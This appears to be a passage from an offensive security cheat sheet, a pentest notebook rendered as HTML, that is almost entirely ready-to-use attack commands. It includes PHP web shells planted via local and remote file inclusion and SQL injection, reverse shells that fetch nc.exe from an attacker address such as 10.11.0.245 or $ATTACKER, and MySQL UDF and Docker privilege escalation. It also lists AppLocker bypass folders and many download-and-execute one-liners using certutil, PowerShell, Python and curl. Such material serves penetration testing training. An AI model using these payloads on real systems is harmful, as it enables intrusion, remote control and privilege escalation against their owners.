<div class="highlight"><pre><span></span><code># https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj

# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj
</code></pre></div>
<h3 id="local-file-inclusion-to-shell">Local File Inclusion to Shell</h3>
<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="m">192</span>.168.1.102<span class="w"> </span><span class="m">80</span>
GET<span class="w"> </span>/&lt;?php<span class="w"> </span>passthru<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;<span class="w"> </span>HTTP/1.1
Host:<span class="w"> </span><span class="m">192</span>.168.1.102
Connection:<span class="w"> </span>close

<span class="c1"># Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&amp;cmd=id</span>
</code></pre></div>
<h3 id="local-file-inclusion-reading-files">Local File Inclusion: Reading Files</h3>
<div class="highlight"><pre><span></span><code>file:///etc/passwd

http://example.com/index.php?page<span class="o">=</span>php://input<span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>ls
<span class="w">    </span>POST:<span class="w"> </span>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;
http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
<span class="w">    </span>POST:<span class="w"> </span>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="s1">&#39;uname -a&#39;</span><span class="o">)</span><span class="p">;</span>die<span class="o">()</span><span class="p">;</span><span class="w"> </span>?&gt;

expect://whoami
http://example.com/index.php?page<span class="o">=</span>php://filter/read<span class="o">=</span>string.rot13/resource<span class="o">=</span>index.php
http://example.com/index.php?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index.php
http://example.com/index.php?page<span class="o">=</span>php://filter/zlib.deflate/convert.base64-encode/resource<span class="o">=</span>/etc/passwd
http://example.net/?page<span class="o">=</span>data://text/plain<span class="p">;</span>base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4<span class="o">=</span><span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>id
http://10.1.1.1/index.php?page<span class="o">=</span>data://text/plain,%3C?php%20system%28%22uname%20-a%22%29<span class="p">;</span>%20?%3E

<span class="c1"># ZIP Wrapper</span>
<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;pre&gt;&lt;?php system(</span><span class="nv">$_GET</span><span class="s2">[&#39;cmd&#39;]); ?&gt;&lt;/pre&gt;&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>payload.php<span class="p">;</span><span class="w">  </span>
zip<span class="w"> </span>payload.zip<span class="w"> </span>payload.php<span class="p">;</span><span class="w">   </span>
mv<span class="w"> </span>payload.zip<span class="w"> </span>shell.jpg<span class="p">;</span><span class="w">    </span>
http://example.com/index.php?page<span class="o">=</span>zip://shell.jpg%23payload.php

<span class="c1"># Loop through file descriptors</span>
curl<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d&#39;</span><span class="w"> </span>--output<span class="w"> </span>-
</code></pre></div>
<h3 id="remote-file-inclusion-shell-windows-php">Remote File Inclusion Shell: Windows + PHP</h3>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;powershell -Command </span><span class="se">\&quot;</span><span class="s2">&amp; {(New-Object System.Net.WebClient).DownloadFile(&#39;http://10.11.0.245/netcat/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe</span><span class="se">\&quot;</span><span class="s2"> }&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span>
</code></pre></div>
<h3 id="sql-injection-to-shell-or-backdoor">SQL Injection to Shell or Backdoor</h3>
<div class="highlight"><pre><span></span><code><span class="o">#</span><span class="w"> </span><span class="n">Assumed</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">columns</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">target</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">vulnParam</span><span class="o">=</span><span class="mi">0</span><span class="s1">&#39; UNION ALL SELECT 1,&quot;&lt;?php system($_REQUEST[&#39;</span><span class="n">cmd</span><span class="err">&#39;</span><span class="p">]);</span><span class="o">?&gt;</span><span class="ss">&quot;,2,3 INTO OUTFILE &quot;</span><span class="k">c</span><span class="p">:</span><span class="o">/</span><span class="n">evil</span><span class="p">.</span><span class="n">php</span><span class="err">&quot;</span><span class="c1">-- uMj</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1"># sqlmap; post-request - captured request via Burp Proxy via Save Item to File.</span>
sqlmap<span class="w"> </span>-r<span class="w"> </span>post-request<span class="w"> </span>-p<span class="w"> </span>item<span class="w"> </span>--level<span class="o">=</span><span class="m">5</span><span class="w"> </span>--risk<span class="o">=</span><span class="m">3</span><span class="w"> </span>--dbms<span class="o">=</span>mysql<span class="w"> </span>--os-shell<span class="w"> </span>--threads<span class="w"> </span><span class="m">10</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="c1"># netcat reverse shell via mssql injection when xp_cmdshell is available</span>
<span class="m">1000</span><span class="s1">&#39;;+exec+master.dbo.xp_cmdshell+&#39;</span><span class="o">(</span>echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye<span class="o">)</span>+&gt;+c:<span class="se">\f</span>tp.txt+%26+ftp+-s:c:<span class="se">\f</span>tp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd<span class="err">&#39;</span><span class="p">;</span>--
</code></pre></div>
<h3 id="sqlite-injection-to-shell-or-backdoor">SQLite Injection to Shell or Backdoor</h3>
<div class="highlight"><pre><span></span><code><span class="n">ATTACH</span><span class="w"> </span><span class="k">DATABASE</span><span class="w"> </span><span class="s1">&#39;/home/www/public_html/uploads/phpinfo.php&#39;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">pwn</span><span class="p">;</span><span class="w"> </span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">pwn</span><span class="p">.</span><span class="n">shell</span><span class="w"> </span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="nb">TEXT</span><span class="p">);</span><span class="w"> </span>
<span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">pwn</span><span class="p">.</span><span class="n">shell</span><span class="w"> </span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;&lt;?php system($_REQUEST[&#39;</span><span class="n">cmd</span><span class="s1">&#39;]);?&gt;&#39;</span><span class="p">);</span>
</code></pre></div>
<h3 id="ms-sql-console">MS-SQL Console</h3>
<div class="highlight"><pre><span></span><code>mssqlclient.py<span class="w"> </span>-port<span class="w"> </span><span class="m">27900</span><span class="w"> </span>user:password@10.1.1.1
sqsh<span class="w"> </span>-S<span class="w"> </span><span class="m">10</span>.1.1.1<span class="w"> </span>-U<span class="w"> </span>user<span class="w"> </span>-P<span class="w"> </span>password
</code></pre></div>
<h3 id="upgradig-non-interactive-shell">Upgradig Non-Interactive Shell</h3>
<div class="highlight"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
/bin/busybox<span class="w"> </span>sh
</code></pre></div>
<h3 id="python-input-code-injection">Python Input Code Injection</h3>
<div class="highlight"><pre><span></span><code><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span>
</code></pre></div>
<h2 id="local-enumeration-privilege-escalation">Local Enumeration &amp; Privilege Escalation</h2>
<p><img alt="https://github.com/sagishahar/lpeworkshop" src="../../.gitbook/assets/privesc.jpg" /></p>
<h3 id="check-applocker-policies">Check AppLocker Policies</h3>
<div class="highlight"><pre><span></span><code>Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
</code></pre></div>
<h3 id="applocker-writable-windows-directories">Applocker: Writable Windows Directories</h3>
<div class="highlight"><pre><span></span><code># list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
</code></pre></div>
<h3 id="find-writable-filesfolders-in-windows">Find Writable Files/Folders in Windows</h3>
<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get</span><span class="o">-</span><span class="n">ChildItem</span><span class="w"> </span><span class="s">&quot;c:\windows\&quot; -recurse -ErrorAction SilentlyContinue</span>
<span class="err">$</span><span class="n">a</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="err">$</span><span class="n">fileName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">fullname</span>
<span class="w">    </span><span class="err">$</span><span class="n">acls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">get</span><span class="o">-</span><span class="n">acl</span><span class="w"> </span><span class="err">$</span><span class="n">fileName</span><span class="w">  </span><span class="o">-</span><span class="n">ErrorAction</span><span class="w"> </span><span class="n">SilentlyContinue</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">-</span><span class="n">exp</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">{</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">filesystemrights</span><span class="w"> </span><span class="o">-</span><span class="n">match</span><span class="w"> </span><span class="s">&quot;full|modify|write&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">and</span><span class="w"> </span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">identityreference</span><span class="w"> </span><span class="o">-</span><span class="n">match</span><span class="w"> </span><span class="s">&quot;authenticated users|everyone|$env:username&quot;</span><span class="p">}</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="err">$</span><span class="n">acls</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="err">$</span><span class="k">null</span><span class="p">)</span>
<span class="w">    </span><span class="p">{</span>
<span class="w">        </span><span class="na">[pscustomobject]</span><span class="err">@</span><span class="p">{</span>
<span class="w">            </span><span class="n">filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">fileName</span>
<span class="w">            </span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">acls</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">-</span><span class="n">exp</span><span class="w"> </span><span class="n">identityreference</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="check-if-powershell-logging-is-enabled">Check if Powershell Logging is Enabled</h3>
<div class="highlight"><pre><span></span><code>reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
</code></pre></div>
<h3 id="check-winevent-logs-for-securestring-exposure">Check WinEvent Logs for SecureString Exposure</h3>
<div class="highlight"><pre><span></span><code><span class="n">Get</span><span class="o">-</span><span class="n">WinEvent</span><span class="w"> </span><span class="o">-</span><span class="n">FilterHashtable</span><span class="w"> </span><span class="err">@</span><span class="p">{</span><span class="n">LogName</span><span class="o">=</span><span class="err">&#39;</span><span class="n">Microsoft</span><span class="o">-</span><span class="n">Windows</span><span class="o">-</span><span class="n">PowerShell</span><span class="o">/</span><span class="n">Operational</span><span class="err">&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">ID</span><span class="o">=</span><span class="m">4104</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="o">-</span><span class="n">Property</span><span class="w"> </span><span class="n">Message</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="o">-</span><span class="n">String</span><span class="w"> </span><span class="o">-</span><span class="n">Pattern</span><span class="w"> </span><span class="err">&#39;</span><span class="n">SecureString</span><span class="err">&#39;</span>
</code></pre></div>
<h3 id="check-winevent-for-machine-wakesleep-times">Check WinEvent for Machine Wake/Sleep times</h3>
<div class="highlight"><pre><span></span><code><span class="n">Get</span><span class="o">-</span><span class="n">WinEvent</span><span class="w"> </span><span class="o">-</span><span class="n">FilterHashTable</span><span class="w"> </span><span class="err">@</span><span class="p">{</span><span class="w"> </span><span class="n">ProviderName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Microsoft</span><span class="o">-</span><span class="n">Windows</span><span class="o">-</span><span class="n">Power</span><span class="o">-</span><span class="n">TroubleShooter</span><span class="err">&#39;</span><span class="w">  </span><span class="p">;</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">}</span><span class="o">|</span><span class="n">Select</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="o">-</span><span class="n">Property</span><span class="w"> </span><span class="err">@</span><span class="p">{</span><span class="n">n</span><span class="o">=</span><span class="err">&#39;</span><span class="n">Sleep</span><span class="err">&#39;</span><span class="p">;</span><span class="n">e</span><span class="o">=</span><span class="p">{</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="m">0</span><span class="p">].</span><span class="n">Value</span><span class="p">}},</span><span class="err">@</span><span class="p">{</span><span class="n">n</span><span class="o">=</span><span class="err">&#39;</span><span class="n">Wake</span><span class="err">&#39;</span><span class="p">;</span><span class="n">e</span><span class="o">=</span><span class="p">{</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="m">1</span><span class="p">].</span><span class="n">Value</span><span class="p">}}</span>
</code></pre></div>
<h3 id="audit-policies">Audit Policies</h3>
<div class="highlight"><pre><span></span><code>auditpol /get /category:*
</code></pre></div>
<h3 id="check-if-lsass-is-running-in-ppl">Check if LSASS is running in PPL</h3>
<div class="highlight"><pre><span></span><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
</code></pre></div>
<h3 id="binary-exploitation-with-immunitydebugger">Binary Exploitation with ImmunityDebugger</h3>
<h4 id="get-loaded-modules">Get Loaded Modules</h4>
<div class="highlight"><pre><span></span><code># We&#39;re interested in modules without protection, Read &amp; Execute permissions
!mona modules
</code></pre></div>
<h4 id="finding-jmp-esp-address">Finding JMP ESP Address</h4>
<div class="highlight"><pre><span></span><code>!mona find -s &quot;\xFF\xE4&quot; -m moduleName
</code></pre></div>
<h3 id="cracking-a-zip-password">Cracking a ZIP Password</h3>
<div class="highlight"><pre><span></span><code>fcrackzip<span class="w"> </span>-u<span class="w"> </span>-D<span class="w"> </span>-p<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>bank-account.zip
</code></pre></div>
<h3 id="setting-up-simple-http-server">Setting up Simple HTTP server</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Linux</span>
python<span class="w"> </span>-m<span class="w"> </span>SimpleHTTPServer<span class="w"> </span><span class="m">80</span>
python3<span class="w"> </span>-m<span class="w"> </span>http.server
ruby<span class="w"> </span>-r<span class="w"> </span>webrick<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</span>
php<span class="w"> </span>-S<span class="w"> </span><span class="m">0</span>.0.0.0:80
</code></pre></div>
<h3 id="mysql-user-defined-fuction-privilge-escalation">MySQL User Defined Fuction Privilge Escalation</h3>
<p>Requires raptor_udf2.c and sid-shell.c or full raptor.tar:</p>
<p>{% file src="../../.gitbook/assets/sid-shell.c" %}</p>
<p>{% file src="../../.gitbook/assets/raptor_udf2.c" %}</p>
<p>{% file src="../../.gitbook/assets/raptor.tar" %}</p>
<div class="highlight"><pre><span></span><code><span class="n">gcc</span><span class="w"> </span><span class="o">-</span><span class="n">g</span><span class="w"> </span><span class="o">-</span><span class="n">shared</span><span class="w"> </span><span class="o">-</span><span class="nv">Wl</span><span class="p">,</span><span class="o">-</span><span class="n">soname</span><span class="p">,</span><span class="n">raptor_udf2</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">raptor_udf2</span><span class="p">.</span><span class="n">so</span><span class="w"> </span><span class="n">raptor_udf2</span><span class="p">.</span><span class="n">o</span><span class="w"> </span><span class="o">-</span><span class="n">lc</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="n">use</span><span class="w"> </span><span class="n">mysql</span><span class="p">;</span>
<span class="n">create</span><span class="w"> </span><span class="n">table</span><span class="w"> </span><span class="n">npn</span><span class="p">(</span><span class="n">line</span><span class="w"> </span><span class="n">blob</span><span class="p">);</span>
<span class="n">insert</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">npn</span><span class="w"> </span><span class="n">values</span><span class="p">(</span><span class="n">load_file</span><span class="p">(</span><span class="n">&#39;/tmp/raptor_udf2.so&#39;</span><span class="p">));</span>
<span class="n">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">npn</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="n">&#39;/usr/lib/raptor_udf2.so&#39;</span><span class="p">;</span>
<span class="n">create</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">do_system</span><span class="w"> </span><span class="n">returns</span><span class="w"> </span><span class="n">integer</span><span class="w"> </span><span class="n">soname</span><span class="w"> </span><span class="n">&#39;raptor_udf2.so&#39;</span><span class="p">;</span>
<span class="n">select</span><span class="w"> </span><span class="n">do_system</span><span class="p">(</span><span class="n">&#39;chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell&#39;</span><span class="p">);</span>
</code></pre></div>
<h3 id="docker-privilege-esclation">Docker Privilege Esclation</h3>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>Dockerfile<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>my-docker-image<span class="w"> </span>.<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span><span class="nv">$PWD</span>:/stuff<span class="w"> </span>-t<span class="w"> </span>my-docker-image<span class="w"> </span>/bin/sh<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./sh<span class="w"> </span>-c<span class="w"> </span>id<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>./sh
</code></pre></div>
<h3 id="resetting-root-password">Resetting root Password</h3>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;root:spotless&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>chpasswd
</code></pre></div>
<h3 id="uploading-files-to-target-machine">Uploading Files to Target Machine</h3>
<h4 id="tftp">TFTP</h4>
<div class="highlight"><pre><span></span><code><span class="c1">#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp</span>
service<span class="w"> </span>atftpd<span class="w"> </span>start

<span class="c1"># Windows</span>
tftp<span class="w"> </span>-i<span class="w"> </span><span class="nv">$ATTACKER</span><span class="w"> </span>get<span class="w"> </span>/download/location/file<span class="w"> </span>/save/location/file
</code></pre></div>
<h4 id="ftp">FTP</h4>
<div class="highlight"><pre><span></span><code><span class="c1"># Linux: set up ftp server with anonymous logon access;</span>
twistd<span class="w"> </span>-n<span class="w"> </span>ftp<span class="w"> </span>-p<span class="w"> </span><span class="m">21</span><span class="w"> </span>-r<span class="w"> </span>/file/to/serve

<span class="c1"># Windows shell: read FTP commands from ftp-commands.txt non-interactively;</span>
<span class="nb">echo</span><span class="w"> </span>open<span class="w"> </span><span class="nv">$ATTACKER</span>&gt;ftp-commands.txt
<span class="nb">echo</span><span class="w"> </span>anonymous&gt;&gt;ftp-commands.txt
<span class="nb">echo</span><span class="w"> </span>whatever&gt;&gt;ftp-commands.txt
<span class="nb">echo</span><span class="w"> </span>binary&gt;&gt;ftp-commands.txt
<span class="nb">echo</span><span class="w"> </span>get<span class="w"> </span>file.exe&gt;&gt;ftp-commands.txt
<span class="nb">echo</span><span class="w"> </span>bye&gt;&gt;ftp-commands.txt<span class="w"> </span>
ftp<span class="w"> </span>-s:ftp-commands.txt

<span class="c1"># Or just a one-liner</span>
<span class="o">(</span><span class="nb">echo</span><span class="w"> </span>open<span class="w"> </span><span class="m">10</span>.11.0.245<span class="p">&amp;</span><span class="nb">echo</span><span class="w"> </span>anonymous<span class="p">&amp;</span><span class="nb">echo</span><span class="w"> </span>whatever<span class="p">&amp;</span><span class="nb">echo</span><span class="w"> </span>binary<span class="p">&amp;</span><span class="nb">echo</span><span class="w"> </span>get<span class="w"> </span>nc.exe<span class="p">&amp;</span><span class="nb">echo</span><span class="w"> </span>bye<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>ftp.txt<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>ftp<span class="w"> </span>-s:ftp.txt<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>nc.exe<span class="w"> </span><span class="m">10</span>.11.0.245<span class="w"> </span><span class="m">443</span><span class="w"> </span>-e<span class="w"> </span>cmd
</code></pre></div>
<h4 id="certutil">CertUtil</h4>
<div class="highlight"><pre><span></span><code><span class="n">certutil</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">urlcache</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//10.0.0.5/40564.exe bad.exe</span>
</code></pre></div>
<h4 id="php_1">PHP</h4>
<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">&quot;/var/tmp/shell.php&quot;</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;http://10.11.0.245/shell.php&quot;</span><span class="p">));</span> <span class="cp">?&gt;</span>
</code></pre></div>
<h4 id="python_1">Python</h4>
<div class="highlight"><pre><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;from urllib import urlretrieve; urlretrieve(&#39;http://10.11.0.245/nc.exe&#39;, &#39;C:</span><span class="se">\\</span><span class="s2">Temp</span><span class="se">\\</span><span class="s2">nc.exe&#39;)&quot;</span>
</code></pre></div>
<h4 id="http-powershell">HTTP: Powershell</h4>
<div class="highlight"><pre><span></span><code><span class="n">powershell</span><span class="w"> </span><span class="o">-</span><span class="n">Command</span><span class="w"> </span><span class="s">&quot;&amp; {(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="n">powershell</span><span class="w"> </span><span class="o">-</span><span class="n">Command</span><span class="w"> </span><span class="s">&quot;&amp; {(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;); Start-Process nc.exe -NoNewWindow -Argumentlist &#39;$ATTACKER 4444 -e cmd.exe&#39;&quot;</span><span class="w"> </span><span class="p">}</span>
<span class="n">powershell</span><span class="w"> </span><span class="o">-</span><span class="n">Command</span><span class="w"> </span><span class="s">&quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://$ATTACKER/nc.exe&#39;,&#39;nc.exe&#39;)&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">Start</span><span class="o">-</span><span class="n">Process</span><span class="w"> </span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">NoNewWindow</span><span class="w"> </span><span class="o">-</span><span class="n">Argumentlist</span><span class="w"> </span><span class="err">&#39;$</span><span class="n">ATTACKER</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="err">&#39;</span><span class="s">&quot;</span>
<span class="n">powershell</span><span class="w"> </span><span class="p">(</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="err">&#39;</span><span class="n">http</span><span class="p">:</span><span class="c1">//$ATTACKER/file.exe&#39;,&#39;file.exe&#39;);(New-Object -com Shell.Application).ShellExecute(&#39;file.exe&#39;);</span>

<span class="err">#</span><span class="w"> </span><span class="n">download</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="nn">default</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="n">credentials</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">launch</span>
<span class="n">powershell</span><span class="w"> </span><span class="o">-</span><span class="n">command</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="err">$</span><span class="n">b</span><span class="o">=</span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">;</span><span class="w"> </span><span class="err">$</span><span class="n">b</span><span class="p">.</span><span class="n">Proxy</span><span class="p">.</span><span class="n">Credentials</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">CredentialCache</span><span class="p">]::</span><span class="n">DefaultNetworkCredentials</span><span class="p">;</span><span class="w"> </span><span class="err">$</span><span class="n">b</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s">&quot;http://$attacker/nc.exe&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out</span><span class="o">-</span><span class="n">File</span><span class="w"> </span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span><span class="p">;</span><span class="w"> </span><span class="n">Start</span><span class="o">-</span><span class="n">Process</span><span class="w"> </span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">NoNewWindow</span><span class="w"> </span><span class="o">-</span><span class="n">Argumentlist</span><span class="w"> </span><span class="err">&#39;$</span><span class="n">ATTACKER</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="err">&#39;</span><span class="s">&quot; }</span>
</code></pre></div>
<h4 id="http-vbscript">HTTP: VBScript</h4>
<p>Copy and paste contents of <a href="https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript">wget.vbs</a> into a Windows Shell and then:</p>
<div class="highlight"><pre><span></span><code>cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
</code></pre></div>
<h4 id="http-linux">HTTP: Linux</h4>
<div class="highlight"><pre><span></span><code>wget<span class="w"> </span>http://<span class="nv">$ATTACKER</span>/file
curl<span class="w"> </span>http://<span class="nv">$ATTACKER</span>/file<span class="w"> </span>-O
